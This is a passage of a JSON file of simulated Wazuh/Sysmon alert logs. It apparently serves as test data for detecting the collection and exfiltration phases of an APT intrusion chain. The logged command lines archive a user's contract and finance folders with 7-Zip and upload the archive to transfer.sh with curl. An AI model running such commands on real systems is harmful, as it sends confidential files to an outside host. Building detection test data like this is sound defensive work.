            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.535500610",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:08:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000012}",
              "processId": "6900",
              "image": "C:\\Program Files\\7-Zip\\7z.exe",
              "commandLine": "7z.exe a -p\"Summer2025\" C:\\Users\\Public\\export.7z C:\\Users\\john.doe\\Documents\\Contracts\\* C:\\Users\\john.doe\\Documents\\Finance\\*",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 10: Collection - Archive created",
      "sequence": 19,
      "timestamp": "2026-01-29T08:08:30.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 11: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event11",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.992614443",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "11",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:08:30.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000012}",
              "processId": "6900",
              "image": "C:\\Program Files\\7-Zip\\7z.exe",
              "targetFilename": "C:\\Users\\Public\\export.7z",
              "creationUtcTime": "2026-01-29 08:08:30.000",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 11: Exfiltration - DNS query to exfil site",
      "sequence": 20,
      "timestamp": "2026-01-29T08:09:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.482308255",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:09:00.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000013}",
              "processId": "7000",
              "image": "C:\\Windows\\System32\\curl.exe",
              "queryName": "transfer.sh",
              "queryStatus": "0",
              "queryResults": "type:  5 transfer.sh;95.216.1.234;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 11: Exfiltration - Upload to cloud",
      "sequence": 21,
      "timestamp": "2026-01-29T08:09:01.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.149941201",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:09:01.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000013}",
              "processId": "7000",
              "image": "C:\\Windows\\System32\\curl.exe",
              "commandLine": "curl.exe --upload-file C:\\Users\\Public\\export.7z https://transfer.sh/export.7z",
              "currentDirectory": "C:\\Users\\john.doe\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "High",
              "parentProcessGuid": "{APT-CHAIN-0001-0001-0001-000000000006}",
              "parentProcessId": "6300",
              "parentImage": "C:\\Windows\\System32\\cmd.exe",
              "parentCommandLine": "cmd.exe"
            }
          }
        }
      }
    },
    {
      "_comment": "Phase 11: Exfiltration - Network connection",
      "sequence": 22,
      "timestamp": "2026-01-29T08:09:02.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: Full APT Intrusion Chain",
          "id": "100100",
          "mitre": {
            "id": [
              "T0000"
            ],
            "tactic": [
              "Unknown"
            ],
            "technique": [
              "Full APT Intrusion Chain"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.174249030",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:09:02.000",
              "processGuid": "{APT-CHAIN-0001-0001-0001-000000000013}",
              "processId": "7000",
              "image": "C:\\Windows\\System32\\curl.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "198.51.100.50",
              "sourcePort": "51000",
              "destinationIp": "95.216.1.234",
              "destinationHostname": "transfer.sh",
              "destinationPort": "443"
            }
          }
        }
      }
    }
  ]
}
